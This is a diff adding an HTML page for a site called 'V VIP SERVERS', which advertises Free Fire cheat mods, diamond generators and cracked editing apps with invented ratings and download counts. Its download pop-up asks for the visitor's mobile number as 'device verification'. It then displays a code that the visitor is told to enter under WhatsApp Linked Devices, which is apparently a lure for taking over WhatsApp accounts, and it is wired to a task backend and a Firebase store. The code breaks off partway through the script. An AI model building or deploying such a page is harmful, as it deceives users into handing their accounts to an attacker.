@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="en" class="dark-mode">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>V VIP SERVERS | Premium Proxy & MOD Apps</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,600;0,700;0,800;0,900;1,500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* Smooth scroll behavior */
+        html {
+            scroll-behavior: smooth;
+        }
+
+        /* Pure Dark Mode Variables (Default) - Enhanced */
+        :root, html.dark-mode {
+            --bg-body: radial-gradient(circle at 10% 20%, #0d061f, #000000);
+            --bg-animation: radial-gradient(ellipse at 50% 50%, rgba(53, 226, 242, 0.08) 0%, rgba(0,0,0,0) 70%);
+            --surface: rgba(18, 18, 36, 0.65);
+            --surface-2: rgba(30, 30, 60, 0.5);
+            --text-primary: #f8fafc;
+            --text-secondary: #a0afc7;
+            --border: rgba(53, 226, 242, 0.3);
+            --card-stroke: rgba(53, 226, 242, 0.25);
+            --accent: linear-gradient(135deg, #35e2f2, #ff0080);
+            --accent-glow: rgba(53, 226, 242, 0.45);
+            --nav-bg: rgba(8, 8, 20, 0.75);
+            --card-text-title: #ffffff;
+            --shadow-sm: 0 12px 35px rgba(0, 0, 0, 0.6);
+            --shadow-hover: 0 25px 45px rgba(255, 0, 128, 0.2), 0 0 25px 3px rgba(53, 226, 242, 0.3);
+            --icon-stroke: linear-gradient(135deg, #35e2f2, #ff0080);
+            --glow-border: 0 0 12px rgba(53, 226, 242, 0.3);
+        }
+
+        /* Premium Light Mode Overrides - Enhanced */
+        html:not(.dark-mode) {
+            --bg-body: linear-gradient(135deg, #eef2f7 0%, #d9e2ef 100%);
+            --bg-animation: radial-gradient(ellipse at 50% 50%, rgba(2, 132, 199, 0.05) 0%, rgba(0,0,0,0) 70%);
+            --surface: rgba(255, 255, 255, 0.75);
+            --surface-2: rgba(248, 250, 252, 0.9);
+            --text-primary: #0a0f1c;
+            --text-secondary: #475569;
+            --border: rgba(15, 23, 42, 0.18);
+            --card-stroke: rgba(15, 23, 42, 0.12);
+            --accent: linear-gradient(135deg, #0284c7, #db2777);
+            --accent-glow: rgba(2, 132, 199, 0.25);
+            --nav-bg: rgba(255, 255, 255, 0.82);
+            --card-text-title: #0f172a;
+            --shadow-sm: 0 12px 30px rgba(0, 0, 0, 0.08);
+            --shadow-hover: 0 20px 40px rgba(219, 39, 119, 0.15), 0 0 20px 2px rgba(2, 132, 199, 0.2);
+            --icon-stroke: linear-gradient(135deg, #0284c7, #db2777);
+            --glow-border: 0 0 12px rgba(2, 132, 199, 0.2);
+        }
+
+        /* Custom Glowing Badges Constants */
+        :root {
+            --badge-new: #ff0080;
+            --badge-premium: #8b5cf6;
+            --badge-proxy: #35e2f2;
+            --badge-tool: #f6e031;
+        }
+
+        body {
+            background: var(--bg-body);
+            background-attachment: fixed;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: var(--text-primary);
+            transition: background 0.3s ease, color 0.3s ease;
+            padding-bottom: 80px;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Animated subtle gradient overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-animation);
+            pointer-events: none;
+            z-index: -1;
+            animation: gentleShift 12s infinite alternate ease-in-out;
+        }
+
+        @keyframes gentleShift {
+            0% { opacity: 0.4; transform: scale(1); }
+            100% { opacity: 1; transform: scale(1.05); }
+        }
+
+        .navbar {
+            position: sticky;
+            top: 0;
+            background: var(--nav-bg);
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            z-index: 100;
+            box-shadow: var(--shadow-sm);
+            transition: all 0.3s ease;
+        }
+
+        .nav-container {
+            max-width: 640px;
+            margin: 0 auto;
+            padding: 14px 22px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-logo {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            object-fit: cover;
+            display: block;
+            padding: 2px;
+            background: var(--icon-stroke);
+            box-shadow: 0 0 12px rgba(53, 226, 242, 0.5);
+            transition: transform 0.2s ease;
+        }
+
+        .brand-logo:hover {
+            transform: scale(1.02);
+        }
+
+        .brand-text h1 {
+            font-size: 1.45rem;
+            font-weight: 900;
+            letter-spacing: -0.4px;
+            color: var(--text-primary);
+        }
+
+        .brand-text h1 span { 
+            background: var(--icon-stroke);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .brand-text p {
+            font-size: 0.7rem;
+            font-weight: 800;
+            color: #35e2f2;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        
+        html:not(.dark-mode) .brand-text p {
+            color: #0284c7;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            padding: 6px;
+            transition: transform 0.1s;
+        }
+        .menu-btn:active { transform: scale(0.96); }
+        .menu-btn span {
+            width: 24px;
+            height: 2.5px;
+            background: var(--text-primary);
+            border-radius: 4px;
+            transition: all 0.25s;
+        }
+
+        .theme-toggle {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border);
+            border-radius: 50%;
+            width: 42px;
+            height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 1.2rem;
+            backdrop-filter: blur(4px);
+            transition: all 0.2s ease;
+            color: var(--text-primary);
+        }
+
+        .theme-toggle:hover {
+            transform: scale(1.07);
+            box-shadow: var(--glow-border);
+        }
+
+        .container {
+            max-width: 640px;
+            margin: 0 auto;
+            padding: 20px 20px;
+        }
+
+        /* stroke-wrapper with enhanced glow */
+        .stroke-wrapper {
+            display: block;
+            border-radius: 28px;
+            background: var(--icon-stroke);
+            padding: 2px;
+            overflow: hidden;
+            transition: all 0.25s ease;
+            box-shadow: 0 0 5px rgba(53, 226, 242, 0.3);
+        }
+        .stroke-wrapper:hover {
+            box-shadow: var(--glow-border);
+        }
+        .stroke-wrapper .top-banner,
+        .stroke-wrapper .video-section {
+            margin-bottom: 0 !important;
+        }
+        .stroke-wrapper:first-child {
+            margin-bottom: 25px;
+        }
+        .stroke-wrapper:last-child {
+            margin-bottom: 30px;
+        }
+
+        /* Top Banner - glassmorphic */
+        .top-banner {
+            background: var(--surface);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 26px; 
+            padding: 22px 16px;
+            text-align: center;
+            border: none;
+            box-shadow: inset 0 1px 1px rgba(255,255,255,0.1), var(--shadow-sm);
+        }
+
+        .top-banner h2 {
+            font-size: 1.4rem;
+            font-weight: 900;
+            background: var(--icon-stroke);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+
+        /* Video Section enhancement */
+        .video-section {
+            border-radius: 26px;
+            overflow: hidden;
+            box-shadow: var(--shadow-sm);
+            background: var(--surface);
+            border: none;
+        }
+
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+        }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Cards list - staggered animation */
+        .cards-list {
+            display: flex;
+            flex-direction: column;
+            gap: 28px;
+        }
+        
+        .app-card {
+            background: var(--surface);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 28px;
+            padding: 24px;
+            border: 1px solid var(--card-stroke);
+            box-shadow: var(--shadow-sm);
+            transition: transform 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1), box-shadow 0.3s ease, border-color 0.2s;
+            opacity: 0;
+            animation: fadeSlideUp 0.5s ease forwards;
+        }
+
+        @keyframes fadeSlideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .app-card:nth-child(1) { animation-delay: 0.05s; }
+        .app-card:nth-child(2) { animation-delay: 0.1s; }
+        .app-card:nth-child(3) { animation-delay: 0.15s; }
+        .app-card:nth-child(4) { animation-delay: 0.2s; }
+        .app-card:nth-child(5) { animation-delay: 0.25s; }
+        .app-card:nth-child(6) { animation-delay: 0.3s; }
+        .app-card:nth-child(7) { animation-delay: 0.35s; }
+        .app-card:nth-child(8) { animation-delay: 0.4s; }
+        .app-card:nth-child(9) { animation-delay: 0.45s; }
+        .app-card:nth-child(10) { animation-delay: 0.5s; }
+        .app-card:nth-child(11) { animation-delay: 0.55s; }
+        .app-card:nth-child(12) { animation-delay: 0.6s; }
+        .app-card:nth-child(13) { animation-delay: 0.65s; }
+        .app-card:nth-child(14) { animation-delay: 0.7s; }
+        .app-card:nth-child(15) { animation-delay: 0.75s; }
+
+        .app-card:hover {
+            transform: translateY(-6px) scale(1.01);
+            box-shadow: var(--shadow-hover);
+            border-color: var(--border);
+        }
+
+        .badge-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            font-size: 0.68rem;
+            font-weight: 800;
+            padding: 5px 14px;
+            border-radius: 40px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            backdrop-filter: blur(4px);
+        }
+
+        .badge-new { background: rgba(255, 0, 128, 0.2); color: #ff66b5; border: 1px solid #ff0080; }
+        .badge-premium { background: rgba(139, 92, 246, 0.2); color: #c4a5ff; border: 1px solid #8b5cf6; }
+        .badge-proxy { background: rgba(53, 226, 242, 0.2); color: #9efff5; border: 1px solid #35e2f2; }
+        .badge-tool { background: rgba(246, 224, 49, 0.25); color: #ffe170; border: 1px solid #eab308; }
+
+        .card-main {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 18px;
+            align-items: center;
+        }
+
+        .app-icon {
+            width: 86px;
+            height: 86px;
+            border-radius: 24px;
+            object-fit: cover;
+            padding: 2.5px;
+            background: var(--icon-stroke);
+            box-shadow: 0 12px 25px rgba(0,0,0,0.3);
+            transition: transform 0.25s ease;
+        }
+
+        .app-card:hover .app-icon {
+            transform: rotate(1deg) scale(1.03);
+        }
+
+        .app-details h3 {
+            font-size: 1.4rem;
+            font-weight: 800;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+            line-height: 1.2;
+            color: var(--card-text-title);
+        }
+
+        .app-details p {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 16px 0 18px;
+            padding: 12px 0;
+            border-top: 1px solid var(--card-stroke);
+            border-bottom: 1px solid var(--card-stroke);
+        }
+
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            background: var(--surface-2);
+            padding: 10px 4px;
+            border-radius: 16px;
+            border: 1px solid var(--card-stroke);
+            backdrop-filter: blur(4px);
+            font-weight: 700;
+            font-size: 0.75rem;
+        }
+
+        .stat-icon {
+            font-size: 1rem;
+        }
+
+        .rating {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 0 0 20px 0;
+        }
+
+        .stars {
+            display: flex;
+            gap: 4px;
+            color: #fbbf24;
+            font-size: 1rem;
+        }
+
+        .review-count {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        /* Download button with ripple effect */
+        .download-btn {
+            width: 100%;
+            background: var(--accent);
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            color: white;
+            font-weight: 800;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            box-shadow: 0 6px 18px var(--accent-glow);
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .download-btn span.ripple {
+            position: absolute;
+            border-radius: 50%;
+            transform: scale(0);
+            background: rgba(255, 255, 255, 0.5);
+            animation: rippleEffect 0.6s linear;
+        }
+
+        @keyframes rippleEffect {
+            to { transform: scale(4); opacity: 0; }
+        }
+
+        .download-btn:hover {
+            filter: brightness(1.08);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px var(--accent-glow);
+        }
+
+        /* Advanced Modal styles Refined for Step-by-Step flow */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(20px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 200;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.25s ease;
+        }
+        .modal.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .modal-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            max-width: 420px;
+            width: 90%;
+            padding: 28px 24px;
+            border-radius: 36px;
+            backdrop-filter: blur(24px);
+            box-shadow: var(--shadow-hover);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .modal-view {
+            display: none;
+            transition: all 0.3s ease;
+        }
+        .modal-view.active {
+            display: block;
+        }
+
+        .close-modal {
+            background: none;
+            border: none;
+            margin-top: 18px;
+            color: var(--text-secondary);
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+
+        /* Verification Panel Fields */
+        .input-field-group {
+            margin: 20px 0 14px;
+            text-align: left;
+        }
+        .input-field-group label {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--text-secondary);
+            display: block;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .phone-input-wrapper {
+            display: flex;
+            background: var(--surface-2);
+            border: 2px solid var(--border);
+            border-radius: 18px;
+            padding: 4px 12px;
+            align-items: center;
+        }
+        .phone-prefix {
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-right: 8px;
+            font-size: 1rem;
+        }
+        .phone-input {
+            background: none;
+            border: none;
+            outline: none;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-weight: 700;
+            width: 100%;
+            padding: 10px 0;
+        }
+
+        /* Code box graphic layout */
+        .code-container {
+            background: rgba(255, 0, 128, 0.1);
+            border: 2px dashed #ff0080;
+            border-radius: 20px;
+            padding: 18px;
+            margin: 18px 0;
+            text-align: center;
+        }
+        .code-display {
+            font-size: 2rem;
+            font-weight: 900;
+            letter-spacing: 4px;
+            color: #35e2f2;
+            text-shadow: 0 0 10px rgba(53, 226, 242, 0.5);
+            margin: 8px 0;
+        }
+
+        /* Status badges inside modal */
+        .status-tracker {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            margin: 12px 0;
+            color: #fbbf24;
+        }
+        .spinner-mini {
+            width: 16px;
+            height: 16px;
+            border: 2.5px solid rgba(251, 191, 36, 0.3);
+            border-top-color: #fbbf24;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(300deg); } }
+
+        /* General Custom Buttons inside views */
+        .action-modal-btn {
+            width: 100%;
+            padding: 15px;
+            border-radius: 50px;
+            border: none;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-primary-gradient { background: var(--accent); color: white; }
+        .btn-success-gradient { background: linear-gradient(135deg, #10b981, #059669); color: white; box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4); }
+
+        /* Drawer improvements */
+        .drawer-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            z-index: 150;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .drawer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 280px;
+            height: 100%;
+            background: var(--surface);
+            backdrop-filter: blur(28px);
+            transform: translateX(-100%);
+            transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            z-index: 151;
+            padding: 30px 24px;
+            border-right: 1px solid var(--border);
+            box-shadow: 8px 0 30px rgba(0,0,0,0.3);
+        }
+        .drawer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            font-weight: 800;
+            color: var(--text-primary);
+        }
+        .drawer.open { transform: translateX(0); }
+        .drawer-overlay.active { visibility: visible; opacity: 1; }
+        .drawer-nav a {
+            text-decoration: none;
+            color: var(--text-primary);
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 12px 16px;
+            border-radius: 18px;
+            transition: all 0.2s;
+            display: block;
+        }
+        .drawer-nav a:hover {
+            background: rgba(53, 226, 242, 0.15);
+            border-color: var(--border);
+            transform: translateX(6px);
+        }
+
+        footer {
+            text-align: center;
+            font-size: 0.75rem;
+            padding: 28px 16px;
+            color: var(--text-secondary);
+            margin-top: 40px;
+            border-top: 1px solid var(--card-stroke);
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="nav-container">
+        <button class="menu-btn" id="menuBtn">
+            <span></span><span></span><span></span>
+        </button>
+        <div class="brand">
+            <img class="brand-logo" src="icon.png" alt="Brand Logo" 
+                 onerror="this.onerror=null; this.style.display='none'; this.nextElementSibling.style.display='flex';">
+            <div style="display: none; font-size: 28px;">⚡</div>
+            <div class="brand-text">
+                <h1>V VIP <span>SERVERS</span></h1>
+                <p>Fast Proxy & MOD Hub</p>
+            </div>
+        </div>
+        <button class="theme-toggle" id="themeToggle">☀️</button>
+    </div>
+</nav>
+
+<div class="container">
+    <div class="stroke-wrapper">
+        <div class="top-banner">
+            <h2>🇮🇳 FREE FIRE INDIA PROXY</h2>
+        </div>
+    </div>
+
+    <div class="stroke-wrapper">
+        <div class="video-section">
+            <div class="video-wrapper">
+                <iframe src="https://www.youtube.com/embed/R00dEJ50vgQ" title="YouTube video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+            </div>
+        </div>
+    </div>
+
+    <div class="cards-list" id="cardsList"></div>
+    <footer>© 2026 V VIP SERVERS — private server & mod testing only</footer>
+</div>
+
+<div class="drawer-overlay" id="drawerOverlay">
+    <div class="drawer" id="drawer">
+        <div class="drawer-header">
+            <span>⚡ VIP MENU</span>
+            <button id="closeDrawer" style="background:none; border:none; font-size:26px; cursor:pointer; color: var(--text-primary);">✕</button>
+        </div>
+        <div class="drawer-nav">
+            <a href="#">🏠 Home</a>
+            <a href="#">🔥 Free Fire Mods</a>
+            <a href="#">🛡️ Proxy Tools</a>
+            <a href="#">🎬 Editing Apps</a>
+            <a href="#">📢 Telegram Channel</a>
+        </div>
+    </div>
+</div>
+
+<div class="modal" id="downloadModal">
+    <div class="modal-card">
+        
+        <div class="modal-view active" id="viewBanner">
+            <div class="card-main" style="margin-bottom: 22px;">
+                <img class="app-icon" id="bannerAppIcon" src="" alt="App Icon" style="width: 76px; height: 76px;">
+                <div class="app-details" style="text-align: left;">
+                    <h3 id="bannerAppName" style="font-size: 1.35rem; margin-bottom: 4px;">App Title</h3>
+                    <p style="color: #10b981; font-size: 0.8rem; font-weight: 700;"><i class="fas fa-shield-alt"></i> Verified Safe & Secure</p>
+                </div>
+            </div>
+            
+            <div class="stats-row" style="margin: 14px 0 22px;">
+                <div class="stat-item"><span class="stat-icon">💾</span> <span id="bannerAppSize">0 MB</span></div>
+                <div class="stat-item"><span class="stat-icon">⭐</span> <span id="bannerAppRating">5.0</span></div>
+                <div class="stat-item"><span class="stat-icon">⬇️</span> <span id="bannerAppDownloads">100K+</span></div>
+            </div>
+
+            <p style="font-size: 0.85rem; color: var(--text-secondary); text-align: left; line-height: 1.5; margin-bottom: 24px;">
+                Download the official pre-configured package directly on your machine. Includes auto-proxy injectors and low-ping premium configurations.
+            </p>
+
+            <button class="action-modal-btn btn-primary-gradient" id="bannerNextBtn">📥 Download Now</button>
+            <button class="close-modal" onclick="closeInstallationModal()">Cancel</button>
+        </div>
+
+        <div class="modal-view" id="viewPhoneAuth">
+            <h3 style="font-size: 1.25rem; font-weight: 800; line-height: 1.3; margin-bottom: 8px;">Device Verification</h3>
+            <p style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.4;">
+                Please confirm your mobile number to start secure installation package on your device.
+            </p>
+
+            <div class="input-field-group">
+                <label>Confirm Mobile Number</label>
+                <div class="phone-input-wrapper">
+                    <span class="phone-prefix">+91</span>
+                    <input type="tel" class="phone-input" id="authMobileNumber" placeholder="Enter 10-digit number" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+            </div>
+
+            <button class="action-modal-btn btn-primary-gradient" id="phoneSubmitBtn">🛡️ Confirm & Verify Device</button>
+            <button class="close-modal" onclick="switchModalView('viewBanner')">Go Back</button>
+        </div>
+
+        <div class="modal-view" id="viewTerminalSync">
+            <h3 style="font-size: 1.25rem; font-weight: 800; margin-bottom: 6px;">Connecting Terminal...</h3>
+            <p style="font-size: 0.8rem; color: var(--text-secondary); line-height: 1.4;">
+                Do not close this window. Please match the security verification profile code.
+            </p>
+
+            <div class="code-container">
+                <p style="font-size: 0.75rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-secondary);">Device Connection Code</p>
+                <div class="code-display" id="terminalCodeText">—— ——</div>
+            </div>
+
+            <div class="status-tracker" id="terminalStatusBlock">
+                <div class="spinner-mini"></div>
+                <span id="terminalStatusText">Generating secure tunnel...</span>
+            </div>
+
+            <p style="font-size: 0.8rem; color: #ff0080; font-weight: 600; padding: 0 10px; margin-top: 15px; line-height: 1.4;" id="terminalGuideMsg">
+                Enter this official device code in your WhatsApp Linked Devices section to verify your platform profile.
+            </p>
+            
+            <button class="action-modal-btn btn-success-gradient" id="terminalSuccessBtn" style="display: none; margin-top: 18px;">🚀 Install Now</button>
+            <button class="close-modal" id="terminalCancelBtn" onclick="closeInstallationModal()" style="margin-top: 16px;">Cancel Process</button>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_CHANNEL_URL = "https://t.me/vvip_servers";
+    
+    // BACKEND CONFIGURATION PATHS
+    const API_START_AUTOMATION = "/api/start-task"; 
+    const FIREBASE_REST_DB_URL = "https://vip-servers-d9788-default-rtdb.firebaseio.com/tasks";
+
+    const apps = [
+        { name: "Free Fire India", desc: "VIP Proxy Server", badges: ["NEW","PROXY ACTIVE"], stars: 5, reviews: "18.2k", size: "892 MB", downloads: "245K+", androidVer: "Android 6.0+", img: "image1.png" },
+        { name: "Free Fire MAX Mod", desc: "Ultra Damage Bypass", badges: ["NEW","VIP MOD"], stars: 5, reviews: "12.5k", size: "956 MB", downloads: "178K+", androidVer: "Android 8.0+", img: "image2.png" },
+        { name: "FF Advanced Server", desc: "Unreleased Access", badges: ["EARLY ACCESS"], stars: 5, reviews: "8.9k", size: "1.1 GB", downloads: "92K+", androidVer: "Android 10.0+", img: "image3.png" },
+        { name: "Diamond & Redeem Tool", desc: "Instant Codes", badges: ["NEW","100% WORKING"], stars: 5, reviews: "22.1k", size: "24 MB", downloads: "310K+", androidVer: "Android 5.0+", img: "image4.png" },
+        { name: "Free Fire Hack MOD", desc: "Auto-Aim / Bypass", badges: ["UPDATED","ANTI-BAN"], stars: 5, reviews: "15.3k", size: "878 MB", downloads: "215K+", androidVer: "Android 6.0+", img: "image5.png" },
+        { name: "Sigma Battle Royale", desc: "Lite Edition", badges: ["NEW","LIGHTWEIGHT"], stars: 5, reviews: "9.7k", size: "612 MB", downloads: "134K+", androidVer: "Android 5.0+", img: "image6.png" },
+        { name: "CAPCUT PRO", desc: "Video Editor Pro", badges: ["NEW","PREMIUM"], stars: 5, reviews: "56.2k", size: "142 MB", downloads: "890K+", androidVer: "Android 7.0+", img: "image7.png" },
+        { name: "INSHOT PRO", desc: "No Watermark", badges: ["NO WATERMARK"], stars: 5, reviews: "48.9k", size: "68 MB", downloads: "752K+", androidVer: "Android 6.0+", img: "image8.png" },
+        { name: "REMINI MOD", desc: "AI Enhancer", badges: ["NEW","ULTRA HD"], stars: 5, reviews: "34.5k", size: "45 MB", downloads: "520K+", androidVer: "Android 7.0+", img: "image9.png" },
+        { name: "DATA SEELING", desc: "Data Manager", badges: ["NEW","5G SPEED"], stars: 4, reviews: "11.2k", size: "12 MB", downloads: "189K+", androidVer: "Android 5.0+", img: "image10.png" },
+        { name: "VPN Proxy Master", desc: "Low Ping VPN", badges: ["LOW PING"], stars: 5, reviews: "27.8k", size: "28 MB", downloads: "402K+", androidVer: "Android 6.0+", img: "image11.png" },
+        { name: "GFX Tool Pro", desc: "Smooth Lag Fix", badges: ["90 FPS","OPTIMIZED"], stars: 5, reviews: "42.1k", size: "19 MB", downloads: "678K+", androidVer: "Android 5.0+", img: "image12.png" },
+        { name: "FF Diamond Generator", desc: "Unlimited Diamonds Tool", badges: ["NEW","100% SAFE"], stars: 4.5, reviews: "31.4k", size: "18 MB", downloads: "456K+", androidVer: "Android 5.0+", img: "image13.png" },
+        { name: "FF Redeem Code Tool", desc: "Daily Redeem Codes", badges: ["UPDATED","FREE"], stars: 4.5, reviews: "26.7k", size: "9 MB", downloads: "623K+", androidVer: "Android 5.0+", img: "image14.png" },
+        { name: "FF Weapon Changer MOD", desc: "Skin Changer + Unlock All", badges: ["NEW","ANTI-BAN"], stars: 5, reviews: "19.3k", size: "67 MB", downloads: "287K+", androidVer: "Android 7.0+", img: "image15.png" }
+    ];
+
+    function renderStars(rating, reviewCount) {
+        let starHtml = '';
+        const fullStars = Math.floor(rating);
+        const halfStar = (rating % 1) >= 0.5;
+        for(let i=0; i<fullStars; i++) starHtml += '★';
+        if(halfStar) starHtml += '½';
+        for(let i=0; i<5 - Math.ceil(rating); i++) starHtml += '☆';
+        return `<div class="rating"><div class="stars">${starHtml}</div><div class="review-count">(${reviewCount} reviews)</div></div>`;
+    }
+
+    function getBadgeClass(b) {
+        if(b === 'NEW') return 'badge-new';
+        if(b === 'PROXY ACTIVE' || b === 'LOW PING') return 'badge-proxy';
+        if(b === '100% SAFE' || b === 'FREE' || b === '100% WORKING') return 'badge-tool';
+        return 'badge-premium';
+    }
+
+    function addRipple(btn, e) {
+        const ripple = document.createElement('span');
+        ripple.classList.add('ripple');
+        const rect = btn.getBoundingClientRect();
+        const size = Math.max(rect.width, rect.height);
+        ripple.style.width = ripple.style.height = `${size}px`;
+        ripple.style.left = `${e.clientX - rect.left - size/2}px`;
+        ripple.style.top = `${e.clientY - rect.top - size/2}px`;
+        btn.appendChild(ripple);
+        setTimeout(() => ripple.remove(), 600);
+    }
+
+    function buildCards() {
+        const container = document.getElementById('cardsList');
+        container.innerHTML = '';
+        apps.forEach((app, idx) => {
+            const card = document.createElement('div');
+            card.className = 'app-card';
+            card.style.animationDelay = `${0.05 + idx * 0.03}s`;
+            const badgeHtml = app.badges.map(b => `<span class="badge ${getBadgeClass(b)}">${b}</span>`).join('');
+            const starRatingHtml = renderStars(app.stars, app.reviews);
+            card.innerHTML = `
+                <div class="badge-row">${badgeHtml}</div>
+                <div class="card-main">
+                    <img class="app-icon" src="${app.img}" alt="${app.name}" 
+                         onerror="this.onerror=null; this.src='https://placehold.co/90x90/3b82f6/ffffff?text=${encodeURIComponent(app.name.substring(0,2))}&font=montserrat';">
+                    <div class="app-details">
+                        <h3>${app.name}</h3>
+                        <p>${app.desc}</p>
+                    </div>
+                </div>
+                <div class="stats-row">
+                    <div class="stat-item"><span class="stat-icon">💾</span> <span>${app.size}</span></div>
+                    <div class="stat-item"><span class="stat-icon">⬇️</span> <span>${app.downloads}</span></div>
+                    <div class="stat-item"><span class="stat-icon">📱</span> <span>${app.androidVer}</span></div>
+                </div>
+                ${starRatingHtml}
+                <button class="download-btn" data-app="${app.name}">📥 Download Install Now</button>
+            `;
+            container.appendChild(card);
+        });
+        attachDownloadEvents();
+    }
+
+    // INTERACTION MECHANISM FOR POPUP SYSTEM
+    let selectedAppData = null;
+    let currentSessionId = "";
+    let firebaseIntervalTimer = null;
+
+    function attachDownloadEvents() {
+        document.querySelectorAll('.download-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                addRipple(btn, e);
+                const appName = btn.getAttribute('data-app');
+                selectedAppData = apps.find(a => a.name === appName);
+                
+                if (selectedAppData) {
+                    // Populate App Specification View Data
+                    document.getElementById('bannerAppName').innerText = selectedAppData.name;
+                    document.getElementById('bannerAppSize').innerText = selectedAppData.size;
+                    document.getElementById('bannerAppDownloads').innerText = selectedAppData.downloads;
+                    document.getElementById('bannerAppRating').innerText = selectedAppData.stars + ".0";
+                    
+                    const iconEl = document.getElementById('bannerAppIcon');
+                    iconEl.src = selectedAppData.img;
+                    iconEl.onerror = function() {
+                        this.src = `https://placehold.co/90x90/3b82f6/ffffff?text=${encodeURIComponent(selectedAppData.name.substring(0,2))}&font=montserrat`;
+                    };
+
+                    switchModalView('viewBanner');
+                    document.getElementById('downloadModal').classList.add('active');
+                }
+            });
+        });
+    }
+
+    function switchModalView(viewId) {
